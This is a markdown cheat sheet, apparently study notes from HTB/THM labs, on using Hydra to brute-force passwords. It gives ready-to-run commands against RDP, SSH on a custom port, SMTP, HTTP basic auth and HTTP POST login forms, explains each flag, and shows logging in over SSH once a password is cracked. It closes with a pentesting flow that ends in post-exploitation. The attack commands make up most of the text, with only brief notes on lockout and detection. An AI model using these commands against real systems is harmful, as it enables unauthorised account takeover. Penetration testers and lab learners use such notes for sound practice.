# 📘 Hydra & Network Command Documentation

---

## 1️⃣ Cracking RDP Username/Password

Original (corrected version):

```bash
sudo hydra -L /usr/share/wordlists/usernames.txt -P /usr/share/wordlists/passwords.txt [IP_ADDRESS] rdp
```

### 🔎 Explanation

* `sudo` → Run with root privileges
* `hydra` → Password brute-force tool
* `-L` → Username wordlist file
* `-P` → Password wordlist file
* `[IP_ADDRESS]` → Target IP
* `rdp` → Service (Remote Desktop Protocol)

### 📌 What It Does

Hydra tries every username from the username list with every password from the password list against the RDP service.

---

## 2️⃣ Cracking SSH Password (Specific User)

Corrected command:

```bash
sudo hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://[IP_ADDRESS]
```

### 🔎 Explanation

* `-l george` → Single username
* `-P rockyou.txt` → Password wordlist
* `-s 2222` → Custom port (SSH not running on default 22)
* `ssh://` → Protocol
* `[IP_ADDRESS]` → Target IP

### 📌 What It Does

Brute-forces SSH login for user **george** on port **2222**.

---

## 3️⃣ Connecting to SSH After Crack

Corrected command:

```bash
ssh -p 2222 george@192.168.50.201
```

### 🔎 Explanation

* `-p 2222` → Connect to custom SSH port
* `george@IP` → Login as george

---

## 4️⃣ Brute-Forcing SMTP (Mail Server)

Corrected command:

```bash
sudo hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.215.201 smtp
```

Or if specifying port 25:

```bash
sudo hydra -l user -P rockyou.txt -s 25 192.168.215.201 smtp
```

### 🔎 Explanation

* `smtp` → Simple Mail Transfer Protocol
* Default port: 25

### 📌 Use Case

Testing weak credentials on mail servers.

---

## 5️⃣ Brute-Forcing HTTP Login Page

Corrected:

```bash
sudo hydra -l admin -P rockyou.txt -s 80 -f 192.168.212.201 http-get
```

### 🔎 Explanation

* `http-get` → Used for basic HTTP authentication
* `-f` → Stop after first successful login
* `-s 80` → HTTP port

---

### 🔐 For Login Forms (POST Based)

More realistic example:

```bash
sudo hydra -l admin -P rockyou.txt 192.168.212.201 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=Invalid"
```

---

## 6️⃣ Adjusting MTU for VPN (Fix Slow Hydra / Packet Drop)

```bash
sudo ifconfig tun0 mtu 1250
```

### 🔎 Explanation

* `tun0` → VPN interface
* `mtu 1250` → Reduce packet size

### 📌 Why?

When using VPN (HTB / THM), large packets drop → Hydra fails → Reduce MTU.

---

# 🔥 Common Hydra Options Cheat Sheet

| Option | Meaning            |
| ------ | ------------------ |
| `-l`   | Single username    |
| `-L`   | Username list      |
| `-p`   | Single password    |
| `-P`   | Password list      |
| `-s`   | Custom port        |
| `-f`   | Stop after success |
| `-t`   | Number of threads  |
| `-V`   | Verbose output     |
| `-o`   | Save output        |

---

# 🧠 Real-World Pentesting Flow

1. Scan target with Nmap
2. Identify open services
3. Check for weak authentication
4. Use Hydra for brute force
5. Login after success
6. Post-exploitation

---

# ⚠️ Important Notes

* Hydra works only if:

  * No rate limiting
  * No account lockout
  * Weak passwords exist

* In real production:

  * IDS/IPS may detect brute force
  * Accounts may lock after few attempts
  * Logs will record attempts

